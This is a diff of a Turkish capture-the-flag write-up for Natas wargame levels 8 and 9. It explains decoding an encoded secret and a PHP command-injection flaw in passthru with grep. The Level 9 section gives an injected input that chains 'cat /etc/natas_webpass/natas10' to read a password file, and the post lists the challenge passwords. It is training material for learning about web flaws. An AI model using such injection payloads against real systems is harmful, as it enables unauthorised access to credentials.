@@ -60,7 +60,7 @@ Home ve About sayfalarına götüren iki link mevcut.Linklerin birine tıkladı�
 >> natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 #### Level 8
-
+Kaynak kod şu şekilde:
 {% highlight php %}
 <?
 $encodedSecret = "3d3d516343746d4d6d6c315669563362";
@@ -80,4 +80,27 @@ if(array_key_exists("submit", $_POST)) {
 POST isteği ile alınan değer, sırasıyla base64_encode(),strrev(),bin2hex() fonksiyonlarına tabi tutulması sonucu elde edilen değerin  $encodedSecret değişkenine eşit olması halinde natas9 için parolayı elde edebileceğiz.$encodedString değişkenine sırasıyla hex2bin(),strrev(),base64_decode() fonksiyonlarını uyguladığımızda oubWYf2kBq değerini elde ediyoruz.
 >> natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
-#### Level 10
+#### Level 9
+Kaynak kod şu şekilde:
+{% highlight php %}
+<?
+
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+İstemciden alınan değer $key değişkenine atanıyor ve bu değişken doğrudan passthru fonksiyonu içerisindeki ifadeye yerleştiriliyor.Passthru, system fonksiyonu gibi sistem komutları çalıştırıyor. Yani kod "Command Injection" zafiyeti barındırıyor. 
+
+"; cat /etc/natas_webpass/natas10" # " şeklinde bir input girdiğimizde,passthru fonksiyonu içerisinde ki ifade
+ grep -i ; cat /etc/natas_webpass/natas10" #  dictionary.txt gibi bir hal alıyor.
+ 
+ >> natas:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+ 
+ #### Level 10
+ 
